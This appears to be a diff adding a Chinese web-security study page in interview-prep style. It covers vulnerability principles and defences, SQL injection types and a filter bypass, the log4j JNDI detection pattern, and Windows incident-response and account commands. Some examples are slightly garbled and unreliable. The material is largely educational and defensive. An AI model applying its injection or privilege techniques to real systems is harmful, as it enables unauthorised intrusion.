+</ul>
+<p>2.使用会话管理和令牌</p>
+<ul>
+<li>确保用户在会话期间保持身份认证状态。</li>
+</ul>
+<p>3.强制访问控制：</p>
+<ul>
+<li>确保未经身份认证的用户无法访问敏感资源或执行敏感操作。</li>
+<li>为不同的用户或用户组设置适当的权限，并限制其访问范围。</li>
+</ul>
+<p>4.使用安全协议：</p>
+<ul>
+<li>在用户身份认证过程中，使用安全的通信协议（如HTTPS）来加密用户凭证的传输，防止中间人攻击和凭证窃取。</li>
+</ul>
+<p>5.定期审查和监控：</p>
+<ul>
+<li>定期审查系统的访问日志，监控未经身份认证的访问尝试，及时发现并修复系统中存在的安全漏洞和弱点。</li>
+</ul>
+</li>
+</ul>
+<h5 id="6-不安全的访问控制："><a href="#6-不安全的访问控制：" class="headerlink" title="6. 不安全的访问控制："></a>6. 不安全的访问控制：</h5><ul>
+<li><p><strong>原理：</strong> 不安全的访问控制指应用程序未正确实施访问控制机制，导致攻击者能够访问未经授权的功能或数据。</p>
+</li>
+<li><p><strong>示例：</strong> 目录遍历、未验证的重定向、缺少权限检查等。</p>
+</li>
+<li><p><strong>防御:</strong>    防御不安全的访问控制的手段包括实施最小权限原则、使用多因素身份认证、强化会话管理、定期审查和监控访问活动、以及加密和传输安全措施等。</p>
+</li>
+</ul>
+<h5 id="7-安全配置错误："><a href="#7-安全配置错误：" class="headerlink" title="7. 安全配置错误："></a>7. 安全配置错误：</h5><ul>
+<li><strong>原理：</strong> 安全配置错误指应用程序的安全设置不合理或不完善，使得攻击者能够利用这些配置漏洞来获取敏感信息或执行攻击。</li>
+<li><strong>示例：</strong> 默认配置、未及时更新补丁、开发者调试信息泄露等。</li>
+<li><strong>防御:</strong>    防御安全配置错误包括定期审查和更新安全配置、实施安全最佳实践、使用安全配置工具和自动化脚本、以及培训和教育员工关于安全配置的重要性。</li>
+</ul>
+<h5 id="8-跨站请求伪造（CSRF）攻击："><a href="#8-跨站请求伪造（CSRF）攻击：" class="headerlink" title="8. 跨站请求伪造（CSRF）攻击："></a>8. 跨站请求伪造（CSRF）攻击：</h5><ul>
+<li><p><strong>原理：</strong> 跨站请求伪造攻击是在服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严的情况下,利用用户的登录状态(已认证的会话中的权限)，在用户不知情的情况下利用用户当前的会话凭证（如 cookie）发送伪造的请求，以执行未经授权的操作(修改账户信息、发表评论、转账等）。</p>
+</li>
+<li><p><strong>示例：</strong> 钓鱼攻击、自动提交表单等。</p>
+</li>
+<li><p><strong>防御:</strong>    防御跨站请求伪造（CSRF）攻击的手段包括使用<strong>CSRF令牌验证</strong>、<strong>检查Referer头</strong>、<strong>实施双重提交Cookie等策略</strong>，<strong>二步验证</strong>, 以确保请求是来自合法用户而不是恶意攻击者。</p>
+</li>
+</ul>
+<h5 id="9-使用已知的漏洞："><a href="#9-使用已知的漏洞：" class="headerlink" title="9. 使用已知的漏洞："></a>9. 使用已知的漏洞：</h5><ul>
+<li><p><strong>原理：</strong> 使用已知的漏洞指应用程序使用的第三方组件或库存在已公开的安全漏洞，但未及时更新或修补。</p>
+</li>
+<li><p><strong>示例：</strong> 使用过时的软件版本、未更新的第三方组件、未修补的漏洞等。</p>
+</li>
+<li><p><strong>防御:</strong>    定期更新和修补系统和应用程序、实施漏洞管理程序、使用漏洞扫描工具进行检测和修复、以及监控漏洞公告和威胁情报以及及时采取措施来缓解潜在的风险。</p>
+</li>
+</ul>
+<h5 id="10-不安全的反序列化："><a href="#10-不安全的反序列化：" class="headerlink" title="10. 不安全的反序列化："></a>10. 不安全的反序列化：</h5><ul>
+<li><p><strong>原理：</strong> 不安全的反序列化攻击利用应用程序未正确处理反序列化的数据，导致攻击者能够执行恶意代码或构造攻击序列化数据。</p>
+</li>
+<li><p><strong>示例：</strong> 远程代码执行、未经授权的对象创建等。</p>
+</li>
+<li><p><strong>防御:</strong>    限制和验证反序列化输入、使用安全的序列化库、实施严格的访问控制和权限控制、以及监控和审计序列化和反序列化操作，以减少攻击风险。</p>
+</li>
+</ul>
+<h5 id="ssrf-原理、防御手段、协议-file-gopher-dict"><a href="#ssrf-原理、防御手段、协议-file-gopher-dict" class="headerlink" title="ssrf 原理、防御手段、协议(file gopher dict)"></a><strong>ssrf 原理、防御手段</strong>、协议(file gopher dict)</h5><p>服务端没有对用户提供的可控url进行有效的地址限制和足够的检测，导致用户可以利用服务器,访问恶意资源或作为跳板去攻击内网的或其他服务器</p>
+<p>防御手段：禁用不必要的端口、使用白名单限制url，禁用gopher、dict协议、过滤返回的信息、统一错误信息、</p>
+<h5 id="ssrf利用"><a href="#ssrf利用" class="headerlink" title="ssrf利用"></a>ssrf利用</h5><ol>
+<li><strong>访问内部资源：</strong> 攻击者可以利用SSRF漏洞访问服务器内部的资源，如本地文件系统、数据库、内部网络等，获取敏感信息或者执行未授权的操作。</li>
+<li><strong>攻击内部系统：</strong> 攻击者可以通过SSRF漏洞向内部系统发送恶意请求，如攻击内部Web服务、数据库或者其他服务，以实现进一步的攻击，如数据泄露、拒绝服务等。</li>
+<li><strong>扫描内部网络：</strong> 攻击者可以利用SSRF漏洞扫描服务器所在内部网络的其他主机和服务，获取内部网络拓扑和服务信息，为后续攻击做准备。</li>
+<li><strong>利用其他漏洞：</strong> 攻击者可以利用SSRF漏洞发起攻击，尝试利用其他漏洞，如目标服务器的远程代码执行漏洞、文件读取漏洞等，以获取更多权限或者实现更严重的攻击。</li>
+<li><strong>绕过防火墙和访问控制：</strong> 攻击者可以利用SSRF漏洞绕过防火墙和其他访问控制机制，访问内部系统和服务，获取未授权的访问权限。</li>
+</ol>
+<h5 id="XSS、CSRF、SSRF的区别"><a href="#XSS、CSRF、SSRF的区别" class="headerlink" title="XSS、CSRF、SSRF的区别"></a><strong>XSS、CSRF、SSRF的区别</strong></h5><ul>
+<li>XSS：跨站脚本攻击</li>
+<li>CSRF：跨站请求伪造攻击</li>
+<li>ssrf：服务器请求伪造攻击</li>
+</ul>
+<p>区别：</p>
+<ul>
+<li><p>XSS是服务器对用户提交的数据过滤不严，导致浏览器把用户的输入当成了JS代码并直接返回给客户端执行，从而实现对客户端的攻击目的。</p>
+</li>
+<li><p>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器。</p>
+</li>
+<li><p>SSRF是服务器没有对用户提供的可控url进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器</p>
+</li>
+</ul>
+<h5 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h5><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，进行远程命令和代码执行,从而控制后台系统。</p>
+<p>远程系统命令执行函数:<strong>eval()</strong>,<strong>assert()</strong>,<strong>preg_replace()</strong>,<strong>call_user_func()</strong>,<strong>array_map()</strong></p>
+<p>远程代码执行函数:<strong>system()</strong>,<strong>exec()</strong>,<strong>shell_exec()</strong>,<strong>passthru()</strong>,<strong>popen()</strong></p>
+<h5 id="文件包含漏洞概述"><a href="#文件包含漏洞概述" class="headerlink" title="文件包含漏洞概述"></a>文件包含漏洞概述</h5><p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如在PHP中，提供了：</p>
+<ul>
+<li>include(),include_once()  include即使包含文件发生语法错误也会继续执行</li>
+<li>require(),require_once()  require当文件发生语法错误时停止执行</li>
+</ul>
+<h5 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h5><ul>
+<li><p>越权漏洞(Over permission)指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。</p>
+<p><strong>原因:</strong></p>
+<ul>
+<li><p>越权漏洞形成的原因是后台使用了不合理的权限校验规则，导致攻击者能够绕过系统正常的权限控制机制，获取未经授权的操作权限。通常情况下，越权漏洞容易在需要登录的权限页面上的增、删、改、查等操作中出现。</p>
+<p>示例:</p>
+<ol>
+<li><p><strong>通过隐藏 URL</strong></p>
+<p>实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。</p>
+</li>
+<li><p><strong>直接对象引用</strong></p>
+<p>这种通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。</p>
+</li>
+<li><p><strong>多阶段功能</strong></p>
+<p>多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。</p>
+</li>
+<li><p><strong>静态文件</strong></p>
+<p>很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。</p>
+</li>
+<li><p><strong>平台配置错误</strong></p>
+<p>一些程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。</p>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="IDS-IPS"><a href="#IDS-IPS" class="headerlink" title="IDS&#x2F;IPS"></a>IDS&#x2F;IPS</h4><ul>
+<li><p><strong>入侵检测系统（IDS）</strong>：IDS监视网络流量或系统活动，以识别可能的入侵或恶意行为。当IDS检测到潜在的安全威胁时，它会生成警报，以便安全团队进一步调查和采取必要的措施。</p>
+</li>
+<li><p><strong>入侵防御系统（IPS）</strong>：IPS不仅可以检测潜在的安全威胁，还可以采取主动措施来阻止这些威胁。它可以根据预定义的策略自动执行防御动作，例如阻止特定类型的流量或关闭与已知威胁相关的端口。</p>
+</li>
+<li><p>常用:</p>
+</li>
+</ul>
+<p><strong>中间件漏洞</strong></p>
+<p><strong>Apache</strong></p>
+<ol>
+<li>解析漏洞：多后缀名解析漏洞（从后往前解析，一直解析到可识别的后缀）</li>
+<li>罕见后缀名解析漏洞</li>
+<li>.htaccess解析漏洞</li>
+<li>目录遍历</li>
+<li>命令执行漏洞：CVE-2021-42013</li>
+</ol>
+<p><strong>IIS</strong></p>
+<ol>
+<li>文件名解析漏洞，从前往后解析，遇到分号就截断，忽略分号后面的内容，例如：1.asp;.jpg</li>
+<li>IIS 5.X&#x2F;6.0的文件夹解析漏洞，例如：将文件夹以1.asp命名，该文件夹中的所有文件都会被当做asp文件执行；IIS6.0中，.asp .asa .cer都会被解析执行</li>
+<li>IIS 7.0&#x2F;IIS 7.5的CGI解析漏洞，例如上传1.jpg然后访问1.jpg&#x2F;.php</li>
+<li>HTTP.sys远程代码执行漏洞：MS15-034</li>
+</ol>
+<p><strong>Nginx</strong></p>
+<ol>
+<li>文件解析 </li>
+<li>目录遍历</li>
+<li>CRLF注入（ 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行）</li>
+</ol>
+<p><strong>Tomcat</strong></p>
+<ol>
+<li>远程代码执行 CVE-2019-0232</li>
+<li>弱口令+war后门文件部署</li>
+<li>任意文件写入（CVE-2017-12615）</li>
+</ol>
+<p><strong>WebLogic</strong></p>
+<ol>
+<li>反序列化漏洞</li>
+<li>任意文件上传</li>
+<li>war 后门文件部署</li>
+</ol>
+<h4 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a><strong>业务逻辑漏洞</strong></h4><p><strong>什么是逻辑漏洞？说出至少三种业务逻辑漏洞，以及修复方式</strong></p>
+<p>逻辑漏洞是指程序逻辑不严或过于复杂，导致一些逻辑分支不能正常处理或处理错误</p>
+<p>以支付漏洞为例：常见的有价格修改，支付状态修改，数量最大值溢出，订单替换，支付接口替换，四舍五入，越权支付等等。</p>
+<p>以登陆为例：修改状态信息，密码修改跳过验证。</p>
+<p>密码找回：存在通用型找回凭证，凭证可爆破，验证步骤可以跳过，凭证可抓包获取</p>
+<p>验证码：验证码允许暴力破解，验证码可通过js或改包进行绕过</p>
+<h4 id="服务"><a href="#服务" class="headerlink" title="**服务 **"></a>**服务 **</h4><h5 id="CDN和DNS区别-如何绕过CDN"><a href="#CDN和DNS区别-如何绕过CDN" class="headerlink" title="CDN和DNS区别 如何绕过CDN"></a><strong>CDN和DNS区别 如何绕过CDN</strong></h5><p>CDN：内容分发网络，主要作用是让用户就近访问资源，提高响应速度，避免网络拥塞。</p>
+<p>DNS：域名解析服务器，主要作用是将域名解析为ip地址</p>
+<p>CDN绕过思路：网络空间搜索引擎，国外ping，查看ssl证书信息，dns历史记录查询，app抓包，子域名查询，邮件</p>
+<h5 id="简单说一下DNS的工作原理"><a href="#简单说一下DNS的工作原理" class="headerlink" title="简单说一下DNS的工作原理"></a><strong>简单说一下DNS的工作原理</strong></h5><p>将主机域名转换为ip地址，属于应用层协议，使用udp传输。</p>
+<p>主机向本地域名服务器的查询一般采用递归查询</p>
+<p>本地域名服务器向根域名服务器的查询一般使用迭代查询</p>
+<p>dns的查询过程如下：</p>
+<p>依次向 浏览器缓存、系统缓存、路由器缓存、ips服务器缓存、根域名服务器缓存、顶级域名服务器缓存、主域名服务器缓存查询。</p>
+<h5 id="GET和POST的区别"><a href="#GET和POST的区别" class="headerlink" title="GET和POST的区别"></a><strong>GET和POST的区别</strong></h5><p>get一般时获取数据，post是提交数据</p>
+<p>get把请求的数据放在url上，以问号分割url和传输数据，参数之间以&amp;相连。</p>
+<p>post把数据放在http的包内。</p>
+<p>get请求提交的数据理论上最大是2k，而post理论上没有限制</p>
+<h5 id="Cookie和Session的区别"><a href="#Cookie和Session的区别" class="headerlink" title="Cookie和Session的区别"></a><strong>Cookie和Session的区别</strong></h5><p>存储的位置不同，cookie存放在客户端，session存放在服务器端。</p>
+<p>cookie的值是字符串类型，session的值是object类型</p>
+<p>cookie的存储大小有限制，很多是4k大小；session理论上只受当前服务器内存的限制</p>
+<h4 id="端口"><a href="#端口" class="headerlink" title="**端口 **"></a>**端口 **</h4><h5 id="简要说说3389端口无法连接的几种情况"><a href="#简要说说3389端口无法连接的几种情况" class="headerlink" title="简要说说3389端口无法连接的几种情况"></a><strong>简要说说3389端口无法连接的几种情况</strong></h5><p>3389关闭状态</p>
+<p>端口被修改</p>
+<p>防火墙</p>
+<p>处于内网环境</p>
+<p>超过了服务器最大连接数</p>
+<p>管理员设置了权限，仅指定用户登录</p>
+<h5 id="常问的端口信息"><a href="#常问的端口信息" class="headerlink" title="常问的端口信息"></a><strong>常问的端口信息</strong></h5><p>21：FTP文件传输协议</p>
+<p>22：SSH远程连接</p>
+<p>23：TELNET远程登录</p>
+<p>25：SMTP邮件服务</p>
+<p>53：DNS域名系统</p>
+<p>80：HTTP超文本传输协议</p>
+<p>443：HTTPS安全超文本传输协议</p>
+<p>1433：MSSQL </p>
+<p>3306：MYSQL </p>
+<p>3389：windows远程桌面服务端口</p>
+<p>6379：Redis</p>
+<p>7701：weblogic </p>
+<p>8080：TCP,HTTP协议代理服务器：Apache-tomcat默认端口号</p>
+<h4 id="发现shiro反序列化警告如何判断"><a href="#发现shiro反序列化警告如何判断" class="headerlink" title="**发现shiro反序列化警告如何判断 **"></a>**发现shiro反序列化警告如何判断 **</h4><p>rememberme&#x3D;deleteme（响应包）</p>
+<p>查看请求包里是否有java代码，并且执行系统命令</p>
+<h5 id="如何判断shrio是否攻击成功"><a href="#如何判断shrio是否攻击成功" class="headerlink" title="如何判断shrio是否攻击成功"></a><strong>如何判断shrio是否攻击成功</strong></h5><p>将cookie中rememberme中的内容解码，读出攻击者回连的ip</p>
+<p>payload如果为从攻击ip下载webshell，根据交互ip查询有流量交互，说明攻击成功</p>
+<h5 id="发现一个log4j的rce流量告警，如何确定他是成功了还是失败了"><a href="#发现一个log4j的rce流量告警，如何确定他是成功了还是失败了" class="headerlink" title="发现一个log4j的rce流量告警，如何确定他是成功了还是失败了"></a><strong>发现一个log4j的rce流量告警，如何确定他是成功了还是失败了</strong></h5><p>攻击之后，响应包一般不会有明显的特征。但是攻击一般都是反弹shell，会产生其他告警：如内网失陷</p>
+<p>攻击代码特征：恶意流量须包含${jndi:rmi或${jndi:ldap</p>
+<p>临时防护：禁止使用log4j的服务器外连。（日志服务器正常来说不需要外连）</p>
+<h4 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h4><h5 id="1-增删改查："><a href="#1-增删改查：" class="headerlink" title="1.  增删改查："></a>1.  增删改查：</h5><p>创建新数据库名、表名：creat</p>
+<p>删除新数据库名、表名：drop</p>
+<p><strong>增：</strong>insert into  </p>
+<p>insert 表名 (字段1，字段2)values (信息1，信息2)</p>
+<p><strong>删</strong>：delete delete from 表名   </p>
+<p>delete from 表名 where 字段1&#x3D;信息1 and 字段2&#x3D;信息2</p>
+<p><strong>改：</strong>update </p>
+<p>update 表名 set 字段&#x3D;信息  </p>
+<p>update 表名 set 字段1&#x3D;信息1 where 字段2&#x3D;信息2</p>
+<p><strong>查：</strong>select * from 表名 </p>
+<p><strong>模糊查询：</strong>like ‘%关键字%     </p>
+<p><strong>数据库存在什么漏洞：</strong></p>
+<p>爆破（hydra）、拿webshell（利用日志拿）、提权（udf、mof）</p>
+<p>redis，mongodb：未授权访问（拿webshell）</p>
+<p><strong>手工顺序</strong></p>
+<p>order by 查询有多少字段。 </p>
+<p>union有一个特性：左右的select查询的字段数需要一样。</p>
+<p>找显示位：执行的sql语法结果能在页面显示的位置。</p>
+<p>select table_name from information_schema.tables where table_schema&#x3D;database()</p>
+<p>​     列名</p>
+<h5 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2   SQL注入"></a>2   SQL注入</h5><h6 id="2-1-sql注入漏洞原理"><a href="#2-1-sql注入漏洞原理" class="headerlink" title="2.1.  sql注入漏洞原理"></a>2.1.  sql注入漏洞原理</h6><p>前端参数传值过程中，没有过滤或者过滤不严格，导致可以拼接sql语法到数据库执行。</p>
+<p><strong>示例：</strong></p>
+<p>$id&#x3D; $_GET[‘id’]</p>
+<p>$sql&#x3D;select * from users union select 1，2，（），4 </p>
+<p>select * from users from where id&#x3D;’hello’;</p>
+<p>delete from user where id&#x3D;’1’</p>
+<h6 id="2-2-sql注入类型"><a href="#2-2-sql注入类型" class="headerlink" title="2.2.  sql注入类型"></a>2.2.  sql注入类型</h6><p>1、联合查询：<code>order by union select * from information_schema.tables where table_schema=</code></p>
+<p>2、报错注入：<code>floor()\exp()\updatexml()\select * from information_schema.tables where table_schema=</code></p>
+<p>3、布尔型盲注：<code>right(database(),1,1)\substr()\ascii()\mid()\left()\select * from information_schema.tables where table_schema=</code></p>
+<p>4、时间型盲注：<code>if()\sleep()\right()\substr()\ascii()\mid()\left()\select * from information_schema.tables where table_schema=</code></p>
+<p>5、宽字节注入：%df’  \‘ 编码问题</p>
+<p><img src="https://s2.loli.net/2024/03/29/MSHiIjdN2XDgfbJ.gif" alt="img"></p>
+<p><strong>sleep</strong>被过滤了：</p>
+<p>使用等价函数绕过<code>benchmark()</code></p>
+<h4 id="数据库安全配置"><a href="#数据库安全配置" class="headerlink" title="数据库安全配置"></a>数据库安全配置</h4><h5 id="1-SQL-Server："><a href="#1-SQL-Server：" class="headerlink" title="1. SQL Server："></a>1. SQL Server：</h5><p><strong>部署：</strong></p>
+<ul>
+<li>下载并安装 SQL Server，根据需要选择合适的版本和配置。</li>
+<li>使用 SQL Server Configuration Manager 配置数据库引擎、数据库实例和其他组件。</li>
+<li>创建数据库并配置备份和恢复策略。</li>
+</ul>
+<p><strong>安全加固：</strong></p>
+<ul>
+<li><p>使用复杂的密码保护 SQL Server 登录账户，并限制对数据库的访问权限。</p>
+</li>
+<li><p>启用 SQL Server 的内置安全功能，如 Transparent Data Encryption (TDE)、Always Encrypted 和 Row-Level Security。</p>
+</li>
+</ul>
+<h5 id="2-MySQL："><a href="#2-MySQL：" class="headerlink" title="2. MySQL："></a>2. MySQL：</h5><p><strong>部署：</strong></p>
+<ul>
+<li>下载并安装 MySQL 数据库服务器。</li>
+<li>使用 MySQL 的安装向导进行配置，包括设置数据库实例、数据库目录和端口等。</li>
+<li>创建数据库和用户账户，并设置权限。</li>
+</ul>
+<p><strong>安全加固：</strong></p>
+<ul>
+<li><p>修改默认的管理员账户名称和密码，或创建新的管理员账户，并限制其权限。</p>
+</li>
+<li><p>使用访问控制列表 (ACL) 和权限管理来限制用户对数据库的访问权限。</p>
+</li>
+<li><p>启用 MySQL 的安全功能，如 SSL&#x2F;TLS 加密和身份验证。</p>
+</li>
+</ul>
+<h5 id="3-Redis："><a href="#3-Redis：" class="headerlink" title="3. Redis："></a>3. Redis：</h5><p><strong>部署：</strong></p>
+<ul>
+<li>下载并安装 Redis 数据库服务器。</li>
+<li>配置 Redis 的持久化选项，包括 RDB 快照和 AOF 日志。</li>
+</ul>
+<p><strong>安全加固：</strong></p>
+<ul>
+<li>在生产环境中禁用 Redis 的危险命令，如 FLUSHALL 和 FLUSHDB。</li>
+</ul>
+<h5 id="4-通用漏洞原因"><a href="#4-通用漏洞原因" class="headerlink" title="4. 通用漏洞原因:"></a>4. 通用漏洞原因:</h5><h6 id="1-默认凭证和弱密码："><a href="#1-默认凭证和弱密码：" class="headerlink" title="1. 默认凭证和弱密码："></a>1. 默认凭证和弱密码：</h6><ul>
+<li>默认凭证和弱密码是数据库最常见的漏洞之一。如果使用数据库的默认账户和密码或者设置弱密码，攻击者可以轻易地获取对数据库的访问权限。</li>
+</ul>
+<h6 id="2-未授权访问："><a href="#2-未授权访问：" class="headerlink" title="2. 未授权访问："></a>2. 未授权访问：</h6><ul>
+<li>未正确配置访问控制和权限管理可能导致未授权的用户访问数据库，进而泄露敏感信息或进行恶意操作。</li>
+</ul>
+<h6 id="3-不必要的开放端口："><a href="#3-不必要的开放端口：" class="headerlink" title="3. 不必要的开放端口："></a>3. 不必要的开放端口：</h6><ul>
+<li>开放不必要的数据库端口可能使数据库服务器成为攻击目标。应该仅开放必要的端口，并使用防火墙限制访问。</li>
+</ul>
+<h6 id="4-未及时更新和修补："><a href="#4-未及时更新和修补：" class="headerlink" title="4. 未及时更新和修补："></a>4. 未及时更新和修补：</h6><ul>
+<li>不及时更新数据库软件可能导致系统中存在已知的漏洞，使得攻击者可以利用这些漏洞进行攻击。因此，定期更新和修补数据库软件至关重要。</li>
+</ul>
+<h6 id="5-不必要的服务和功能："><a href="#5-不必要的服务和功能：" class="headerlink" title="5. 不必要的服务和功能："></a>5. 不必要的服务和功能：</h6><ul>
+<li>一些不必要的服务和功能可能会增加系统的攻击面。例如，对于 Redis 数据库，如果不需要，可以禁用不必要的命令，如 FLUSHALL 和 FLUSHDB，以减少攻击风险。</li>
+</ul>
+<h6 id="6-未加密的数据传输："><a href="#6-未加密的数据传输：" class="headerlink" title="6. 未加密的数据传输："></a>6. 未加密的数据传输：</h6><ul>
+<li>如果数据库服务器未加密数据传输，敏感信息可能会在传输过程中被窃取。应该使用加密传输协议，如 SSL&#x2F;TLS，来保护数据传输的安全性。</li>
+</ul>
+<h6 id="7-不安全的配置文件："><a href="#7-不安全的配置文件：" class="headerlink" title="7. 不安全的配置文件："></a>7. 不安全的配置文件：</h6><ul>
+<li>不正确配置数据库服务器的配置文件可能会导致安全漏洞。应该仔细审查和修改配置文件，以确保安全配置。</li>
+</ul>
+<h5 id="5-通用防御"><a href="#5-通用防御" class="headerlink" title="5.通用防御"></a>5.通用防御</h5><p>1.避免共享账户,删除无关账号,修改root用户名,使用强密码,不使用弱口令</p>
+<p>2.网络通信和读写文件时使用加密传输等(ssl&#x2F;ssh)</p>
+<p>3.加强权限管理,配置所需的最小权限</p>
+<p>4.限制开放端口,加强访问控制,设置可信ip访问</p>
+<p>5.禁用不必要的服务和功能</p>
+<p>6.更新和维护数据库软件,修复版本通用漏洞</p>
+<p>7.定期进行安全审计和漏洞扫描，及时发现和修复潜在的安全问题</p>
+<h4 id="态势感知"><a href="#态势感知" class="headerlink" title="态势感知"></a>态势感知</h4><p>态势感知设备（CSP，Cyber Situational Awareness Platform）是一种集成了各种安全技术和功能的网络安全工具，旨在提供全面的网络态势感知、实时监控和对网络安全事件做出响应的能力。使用态势感知设备，可以更好地了解网络中的活动，并及时采取措施来应对威胁。</p>
+<p>以下是使用态势感知设备来分析警告并做出处置的一般步骤：</p>
+<ol>
+<li><strong>监控和数据收集：</strong> 首先，态势感知设备会监视网络流量、系统日志和其他相关数据源，收集有关网络活动的信息。</li>
+<li><strong>事件检测和警告生成：</strong> 根据预定义的规则、模式或异常检测算法分析收集的数据，识别可能的安全事件或异常行为, 生成警告通知安全团队或管理员。</li>
+<li><strong>警报分析：</strong> 安全团队会对生成的警报进行分析，评估其严重性和优先级。他们会检查相关的上下文信息，包括受影响的系统、用户、IP地址等，以便更好地了解警报的意义和可能的影响。</li>
+<li><strong>威胁验证：</strong> 安全团队可能会进行进一步的调查，以验证警报是否代表真实的安全威胁。这可能涉及到检查网络流量、系统日志、文件系统等，以获取更多的证据支持。</li>
+<li><strong>响应和处置：</strong> 一旦确认安全事件的存在，安全团队会采取适当的措施来应对威胁。包括阻止恶意流量、隔离受感染的系统、修复安全漏洞等。</li>
+<li><strong>持续监控和改进：</strong> 完成响应后，安全团队会继续监控网络活动，并对响应效果进行评估。他们还可能会根据经验教训和新的威胁情报来更新和改进警报规则和响应策略，以提高态势感知设备的效能和适应性。</li>
+</ol>
+<h4 id="应急响应与溯源"><a href="#应急响应与溯源" class="headerlink" title="应急响应与溯源"></a>应急响应与溯源</h4><h5 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a><strong>应急响应</strong></h5><p><strong>一、基本流程</strong></p>
+<p>1、收集信息</p>
+<p>收集客户信息和中毒主机信息，包括样本</p>
+<p>2、判断类型</p>
+<p>是否是安全事件，是何种安全事件(比如勒索、挖矿、DOS等)</p>
+<p>3、深入分析</p>
+<p>日志分析、进程分析、启动项分析、样本分析</p>
+<p>4、清理处置</p>
+<p>直接杀掉进程，删除文件，打补丁或修复文件</p>
+<p>5、产出报告</p>
+<p>整理并输出完整的安全事件报告</p>
+<p><strong>二、Windows应急响应时查分析的相关细节</strong></p>
+<p>1、检查服务器是否有弱口令（比如空口令或密码复杂度不够）</p>
+<p>2、检查高危端口是否对外开放(比如SSH服务22端口)</p>
+<p>3、利用D盾等工具检测隐藏账号</p>
+<p>4、结合日志分析eventvwr.msc,查看管理员登陆时间，相关事件是否有异常</p>
+<p><strong>Windows应急响应</strong></p>
+<p><strong>1.1系统账户：</strong>弱口令、22&#x2F;3389 等端口是否对外查看账号的方法：net user（无法列出$用户）lusrmgr.exe（无法找到注册表方式建立的用户）查看注册表（最准）HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\D盾有查看账户的功能</p>
+<p><strong>1.2进程、端口相关查看开放的端口：</strong>netstat -ano重点看状态是 ESTABLISHED 的端口：netstat -ano | findstr ‘estab’查看路由：netstat -rn查看系统信息：msinfo32，依次点击 软件环境→正在运行任务，可以看到当前的进程查找 PID 对应的进程：tasklist | findstr PID</p>
+<p>杀死进程：taskkill &#x2F;f &#x2F;pid 123 &#x2F;ttaskkill &#x2F;f &#x2F;im explorer.exe &#x2F;t</p>
+<p>查看进程对应的文件：依次输入 wmic– process显示 进程–PID–服务：tasklist &#x2F;svc</p>
+<p>查看 Windows 服务所对应的端口：%system%&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;services（一般 %system% 就是 C:\Windows ）</p>
+<p>防火墙配置：netsh firewall show all</p>
+<p><strong>1.3 计划任务、可疑进程服务相关查看服务：</strong>services.msc系统信息查看系统信息及补丁：systeminfo可疑文件和目录最近打开的文件：%UserProfile%\Recent排查的几个点：回收站、浏览器下载记录、浏览器历史记录时间排序，查看最新的文件修改时间在创建时间之前的文件查看日志：eventvwr.msc</p>
+<p><strong>1.4  日志分析系统日志（System.evtx）：</strong>驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等 应用程序日志（Application.evtx）：记录程序运行方面的事件 安全日志（Security.evtx）：登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应修改配置策略，默认的话只会记录一些简单的，可以按照下面这个改配置修改方法：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略</p>
+<p><strong>1.5  快捷常用命令查看域中当前的主机列表：</strong></p>
+<p><code>net view /domain</code> 查看当前域中的用户 </p>
+<p><code>net user /domain</code> 增加一个本地用户 </p>
+<p><code>net user username password /add</code> 将新增的用户加到本地管理员组 </p>
+<p><code>net localgroup &quot;Administrators&quot; username /add</code>   查看域中的密码策略 </p>
+<p><code>net accounts /domain</code> 查看本地组 </p>
+<p><code>net localgroup &quot;Group&quot;</code> 查看域中的组信息 </p>
+<p><code>net group /domain</code> 查看域中指定组的成员 </p>
+<p><code>net group &quot;Domain group&quot; /domain</code> 查看当前机器所在的域名 </p>
+<p><code>net config workstation</code> 查看当前服务器所在的域名 </p>
+<p><code>net config server</code>显示系统信息 </p>
+<p><code>systeminfo</code> 查看远程主机的系统信息 </p>
+<p><code>systeminfo /S ip /U domain\user /P Pwd</code> 显示进程和服务信息 </p>
+<p><code>tasklist /svc</code> 显示所有进程以及DLL信息 </p>
+<p><code>tasklist /m</code> 显示进程和所有者 </p>
